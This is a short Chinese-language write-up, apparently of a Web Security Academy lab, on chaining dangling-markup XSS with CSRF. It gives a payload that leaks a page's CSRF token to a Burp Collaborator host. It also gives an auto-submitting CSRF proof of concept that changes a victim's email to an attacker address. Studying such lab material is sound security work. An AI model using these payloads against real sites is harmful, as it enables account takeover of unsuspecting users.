攻击条件：

1.两个网站可相互访问，在安全策略之内

2.恶意网站（可以是自己搭建的网站）存在存储型xss



利用流程：

1.攻击者在恶意网站上嵌入恶意脚本（可以使用存储型xss，也可以使用自己搭建的网站）

2. 受害网站关键操作，如：更改密码，更改email,支付等地方存在csrf令牌

3.诱使受害者访问恶意网站

4. 恶意网站里面的恶意脚本会获取受害网站关键操作的csrf令牌

5. 使用获取到的csrf令牌，生成csrf poc发送给受害者，受害者点击，即可更改受害者邮箱，密码等





恶意脚本：

```javascript
<script>
location='https://your-lab-id.web-security-academy.net/email?email=%22%3E%3Ctable%20background=%27//your-collaborator-id.burpcollaborator.net?';
</script>
```



csrf poc:

```javascript
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://ac941f5b1e43f70e80e669bd00790046.web-security-academy.net/email/change-email" method="POST">
      <input type="hidden" name="email" value="hacker&#64;evil&#45;user&#46;net" />
      <input type="hidden" name="csrf" value="omSkrJz8jcxQlmBDJbJsTlcoo11iUE5A" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

